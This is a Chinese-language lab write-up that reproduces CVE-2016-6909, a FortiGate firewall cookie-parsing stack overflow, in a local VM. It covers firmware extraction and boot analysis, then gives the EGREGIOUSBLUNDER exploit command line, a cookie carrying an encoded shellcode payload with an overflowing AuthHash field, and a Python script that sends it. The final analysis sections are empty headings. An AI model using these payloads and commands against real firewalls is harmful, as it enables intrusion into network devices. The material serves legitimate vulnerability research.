原文链接：[CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252842#h2-0)

## 环境安装
参考链接：[【高级篇 / FortiGate-VM】(6.4) ❀ 02. 安装并启用 FortiGate VM ❀ FortiGate 防火墙_飞塔防火墙虚拟机_飞塔老梅子的博客-CSDN博客](https://blog.csdn.net/meigang2012/article/details/105246640)

在网上找到FGT_VM-v400-build0482下载，然后解压，双击`Fortigate-VM.orf` 用VMware打开

![](images/Pasted%20image%2020230512214210.png)

然后进行虚拟机设置，设置第一个网络适配器为VMnet8模式。

![](images/Pasted%20image%2020230512214421.png)

设置好后运行虚拟机，账号为`admin` ，密码为空。进去后进行网络设置，ip要和VMnet8在同一个网段，然后主机和防火墙就能ping通了。
```
# 显示接口信息
show system interface
# 配置静态ip
config system interface
edit port1
set mode static
set ip 192.168.219.99/24
set allowaccess ping http https fgfm snmp ssh telnet
end
```

![](images/Pasted%20image%2020230517093126.png)

通过`fnsysctl`命令可以执行一些linux基本命令。
```
fnsysctl ls
```

## 文件提取
首先将硬盘镜像 `fortios.vmdk` 挂载到 `/mnt` 目录下。

作者给出了两种方法，第一种将`fortios.vmdk`设置为虚拟机硬盘，然后使用下面命令挂载。

![](images/Pasted%20image%2020230517094848.png)

```
$ sudo fdisk -l 
... 
Device Boot Start End Sectors Size Id Type 
/dev/sdb1 * 1 262144 262144 128M 83 Linux /dev/sdb2 262145 4194304 3932160 1.9G 83 Linux 
... 
$ sudo mkdir /mnt/fortios 
$ sudo mount /dev/sdb1 /mnt/fortios
```

我用第一种方法没有成功，采用第二种方法。首先将`fortios.vmdk` 拷贝到虚拟机中，然后在对应目录下运行下面命令：
```
sudo modprobe nbd
sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk
sudo mount /dev/nbd1p1 /mnt/fortios
```

之后便可以在`/mnt/fortios` 目录下查看文件了

![](images/Pasted%20image%2020230517095515.png)

利用`file *` 命令查看文件类型，可以发现两个内核镜像文件 `flatkc.smp` 与 `flatkc.nosmp`

![](images/Pasted%20image%2020230517095654.png)

 `extlinux.conf` 中指定了一些基本配置，包括文件系统 `rootfs.gz`

![](images/Pasted%20image%2020230517095742.png)

解压 `rootfs.gz`

![](images/Pasted%20image%2020230517101246.png)

## 启动过程分析
### init
Linux 内核载入后会启动第一个进程 `init`，程序二进制文件通常是 `/sbin/init`，将其拖入 IDA 进行分析：

![](images/Pasted%20image%2020230517101510.png)

故 init 进程分析如下：
-   检查 `/bin.tar.xz` 是否存在，若是则创建子进程执行 `/sbin/xz --check=sha256 -d /bin.tar.xz`，父进程等待子进程结束后删除`/bin.tar.xz`，之后检查 `/bin.tar` 是否存在，若是则创建子进程执行 `/sbin/ftar -xf /bin.tar`，父进程等待子进程结束后删除`/bin.tar`
-   上一步成功后检查 `/migadmin.tar.xz` 是否存在，若是则创建子进程执行 `/sbin/xz --check=sha256 -d /migadmin.tar.xz`，父进程等待子进程结束后删除`/migadmin.tar.xz`，之后检查 `/migadmin.tar` 是否存在，若是则创建子进程执行 `/sbin/ftar -xf /migadmin.tar`，父进程等待子进程结束后删除`/migadmin.tar`
-   删除 `/sbin/xz`
-   删除 `/sbin/ftar`
-   执行 `/bin/init`

切换目录进行解压
```
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz 
sudo chroot . /sbin/ftar -xf /bin.tar 
sudo chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz 
sudo chroot . /sbin/ftar -xf /migadmin.tar
```

### bin目录
`bin.tar.xz` 解压出来的文件基本上都是指向 `/bin/init` 与 `/bin/sysctl` 的软链接。其中诸如 `httpsd` 等网络服务都是前者的软链接，可知前者应当为该防火墙提供的基本的网络服务；而诸如 `chmod` 等常用命令都是后者的软链接，可知后者应当为类似 busybox 一样的工具库，不过更为精简。

![](images/Pasted%20image%2020230517101950.png)

![](images/Pasted%20image%2020230517102041.png)

### bin/init分析
首先会执行 `/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX` 替换自身，该文件其实是 `/bin/init` 的软链接，故这里本质上只是更改了 pid 与 argv[0]，随后会关闭三个标准文件描述符并改变当前工作目录为 `/`，打开 `/dev/null` 并创建三个指向其的文件描述符（0、1、2）。

![](images/Pasted%20image%2020230517102230.png)

启动后的界面如下：

![](images/Pasted%20image%2020230517102637.png)

## PoC
工具下载：
利用程序：
[Fortigate Firewalls - 'EGREGIOUSBLUNDER' Remote Code Execution - Hardware webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/40276)

Nopen:
[AlphabugX/nopen: NOPEN Tool 又名“morerats” 莫雷斯特，是方程式工具包里的工具。 (github.com)](https://github.com/AlphabugX/nopen/tree/main)

获取一个cookie num
```
curl -X HEAD -v http://192.168.219.99/login 2>&1 | grep 'APSCOOKIE'
```

![](images/Pasted%20image%2020230513110255.png)

使用 `egregiousblunder` 测试该漏洞，如下：
```
./egregiousblunder_3.0.0.1 -t 192.168.219.99 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114
```

![](images/Pasted%20image%2020230513105735.png)

此时在 fortigate 的 CLI 中我们便可以看到 httpsd 服务的崩溃信息及栈回溯
![](images/Pasted%20image%2020230513105818.png)

这里没能够成功获得一个 shell，作者初步猜测是 EGREGIOUSBLUNDER 的版本问题。

使用wireshark抓取这个过程的数据包，分析可以发现`0xbffff114` 地址被布置到了http请求头的 Cookie 中的 `AuthHash` 字段，初步推测这应当是作为一个返回地址被布置上去的，说明可能是一个栈溢出漏洞。

![](images/Pasted%20image%2020230517094250.png)

使用 postman 简单仿造该 http 请求如下，使用字符 `A` 简单填充 AuthHash 字段：
```
Cookie:
APSCOOKIE_3943997904=Era=0&Payload=YPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCrSDScPhJeOLyykfQZ0p6du+AOYKT/5qGGQ3z00ca5yQ2PGjz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8qLIjOtLB/I3e7DI6SRyGay/xxEJu30VQfm/yU/RMIL/Al+TcHpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

![](images/Pasted%20image%2020230513113918.png)

当我们的字符 A 数量达到 0x60 时再一次发生了 crash，不过这一次的栈回溯更为详细

![](images/Pasted%20image%2020230517094419.png)

为了方便构造 payload 进行利用，接下来作者选择使用 python 发送 http 请求
```
from requests import *
url = 'http://192.168.219.99/index'

headers = {
    'Content-Type':'application/json',
    'Content-Length':'12',
    'Accept':'*/*',
    'Accept-Encoding':'gzip,deflate,br',

    'User-Agent':'PostmanRuntime/7.28.3', 
    'Host':'192.168.116.100', 
    'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + 'A' * 0x60
    }

r = post(url, headers = headers)
print(r.text)
print(r.headers)
```

## 溢出点定位
根据报错信息进行栈回溯：



## 漏洞利用




